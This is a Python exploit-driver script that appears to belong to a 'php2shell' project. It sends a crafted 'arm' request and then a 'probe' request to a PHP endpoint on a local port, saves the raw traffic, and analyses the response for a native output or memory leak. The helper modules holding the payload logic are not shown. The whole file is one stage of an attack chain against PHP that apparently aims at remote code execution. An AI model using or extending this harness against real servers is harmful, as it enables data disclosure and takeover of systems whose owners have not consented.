#!/usr/bin/env python3
import importlib.util, socket
from pathlib import Path

def load(name, path):
    spec = importlib.util.spec_from_file_location(name, path)
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    return m

HERE = Path("/tmp/opencode/realapps/side/php2shell")
LEAK = load("leak", HERE / "native-output-leak.py")
STOCK = load("stock", HERE / "native-output-leak-stock-arm.py")
COMPACT = load("compact", HERE / "compact-stock-tail.py")

OUT = HERE / "runs" / "diag1"
OUT.mkdir(parents=True, exist_ok=True)
host, port, path = "127.0.0.1", 28840, "/index.php"
header = f"{host}:{port}"
timeout = 60.0

arm_body = STOCK.arm_body(b"abcdefgh", COMPACT.ARM_FILENAME_LENGTH)
arm_request = LEAK.request_bytes(header, path, arm_body, None, 23, False)
c = socket.create_connection((host, port), timeout=timeout); c.settimeout(timeout)
c.sendall(arm_request)
arm_result = LEAK.read_response(c.makefile("rb", buffering=0))
c.close()

probe_body = LEAK.probe_body()
probe_request = LEAK.request_bytes(header, path, probe_body, b"", 64, True)
c2 = socket.create_connection((host, port), timeout=timeout); c2.settimeout(timeout)
c2.sendall(probe_request)
probe_result = LEAK.read_response(c2.makefile("rb", buffering=0))
c2.close()

def save(name, request, result):
    (OUT / f"{name}-request.bin").write_bytes(request)
    (OUT / f"{name}-response.bin").write_bytes(result[0])
    (OUT / f"{name}-body.bin").write_bytes(result[1])

save("arm", arm_request, arm_result)
save("probe", probe_request, probe_result)

print("ARM   status:", arm_result[3], "body_bytes:", len(arm_result[1]), "conn:", arm_result[2].get("connection"))
print("PROBE status:", probe_result[3], "body_bytes:", len(probe_result[1]), "conn:", probe_result[2].get("connection"))
print("ARM body head:", arm_result[1][:160])
print("PROBE body head:", probe_result[1][:160])
disclosure = LEAK.analyze(probe_result[1], [arm_request, probe_request])
print("analyze:", disclosure)
